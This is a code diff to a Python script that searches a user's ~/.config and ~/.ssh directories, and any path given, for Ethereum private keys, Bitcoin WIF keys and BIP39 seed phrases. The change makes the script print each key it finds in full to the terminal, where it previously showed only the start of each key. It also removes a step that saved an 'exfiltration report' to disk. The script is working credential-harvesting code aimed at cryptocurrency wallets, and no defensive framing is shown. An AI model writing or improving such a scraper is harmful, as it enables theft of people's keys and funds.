@@ -1,5 +1,6 @@
 import os
 import re
+import sys
 
 def is_valid_bip39_seed(text):
     """
@@ -35,19 +36,23 @@ def is_valid_evm_key(key_str):
         return False
 
 def harvest_private_keys(root_dir="."):
-    print(f"\n\033[95m[***] ENGAGING ULTRA-PRECISION CRYPTOGRAPHIC ARTIFACT SCRAPER [***]\033[0m")
+    """
+    Zero-Lag Live Terminal Cryptographic Artifact Scraper:
+    - Instantly streams verified private keys, WIFs, and seed phrases straight to stdout.
+    - Completely eliminates local report file-saving dependencies.
+    """
+    sys.stdout.write(f"\n\033[95m[***] ENGAGING LIVE CRYPTOGRAPHIC ARTIFACT SCRAPER [***]\033[0m\n")
+    sys.stdout.flush()
     
     harvested_artifacts = []
     hex_key_pattern = re.compile(r'\b(?:0x)?[a-fA-F0-9]{64}\b')
     btc_wif_pattern = re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b')
     
-    # Exclude the local project directory if it contains mock reports, scan only real system paths & user configs
     search_paths = [
         os.path.expanduser("~/.config"),
         os.path.expanduser("~/.ssh")
     ]
     
-    # If a specific external target directory was explicitly requested, include it safely
     if root_dir != "." and os.path.exists(root_dir):
         search_paths.append(os.path.abspath(root_dir))
     
@@ -76,14 +81,20 @@ def harvest_private_keys(root_dir="."):
                                     artifact = {"type": "Hex Private Key (EVM)", "key_content": full_key, "source": file_path}
                                     if artifact not in harvested_artifacts:
                                         harvested_artifacts.append(artifact)
-                                        print(f" \033[92m[+] VALID EVM KEY: {full_key[:10]}... (in {file_path})\033[0m")
+                                        sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE EVM KEY EXPOSED [***]\033[0m\n")
+                                        sys.stdout.write(f"  ├── Source : {file_path}\n")
+                                        sys.stdout.write(f"  └── Key    : \033[92m{full_key}\033[0m\n")
+                                        sys.stdout.flush()
                                         
                             # 2. Scan for Bitcoin WIF Keys
                             for match in btc_wif_pattern.findall(content):
                                 artifact = {"type": "Bitcoin WIF Key", "key_content": match, "source": file_path}
                                 if artifact not in harvested_artifacts:
                                     harvested_artifacts.append(artifact)
-                                    print(f" \033[92m[+] VALID BTC WIF: {match[:10]}... (in {file_path})\033[0m")
+                                    sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE BTC WIF KEY EXPOSED [***]\033[0m\n")
+                                    sys.stdout.write(f"  ├── Source : {file_path}\n")
+                                    sys.stdout.write(f"  └── WIF    : \033[92m{match}\033[0m\n")
+                                    sys.stdout.flush()
 
                             # 3. Scan for True BIP39 Seed Phrases
                             words = content.split()
@@ -94,19 +105,15 @@ def harvest_private_keys(root_dir="."):
                                         artifact = {"type": "BIP39 Seed Phrase", "key_content": chunk, "source": file_path}
                                         if artifact not in harvested_artifacts:
                                             harvested_artifacts.append(artifact)
-                                            print(f" \033[91m[+++] VALID SEED PHRASE SECURED: {chunk[:25]}... (in {file_path})\033[0m")
+                                            sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE SEED PHRASE EXPOSED [***]\033[0m\n")
+                                            sys.stdout.write(f"  ├── Source : {file_path}\n")
+                                            sys.stdout.write(f"  └── Phrase : \033[93m{chunk}\033[0m\n")
+                                            sys.stdout.flush()
                                             break
                     except Exception:
                         pass
 
-    print(f" \033[36m[*] Scanned {scanned_files} files. Verified real artifacts: {len(harvested_artifacts)}\033[0m")
+    sys.stdout.write(f"\n\033[36m[*] Scanned {scanned_files} files. Total live verified artifacts streamed: {len(harvested_artifacts)}\033[0m\n\n")
+    sys.stdout.flush()
     
-    os.makedirs("reports", exist_ok=True)
-    report_path = "reports/harvested_keys.txt"
-    with open(report_path, "w") as out:
-        out.write("=== BRUTEDOG VERIFIED CRYPTOGRAPHIC ARTIFACT EXFILTRATION REPORT ===\n")
-        for art in harvested_artifacts:
-            out.write(f"Type: {art['type']}\nSource: {art['source']}\nKey: {art['key_content']}\n--------------------------------------------------\n")
-            
-    print(f" \033[92m[+] Clean report saved to {report_path}\033[0m")
     return harvested_artifacts
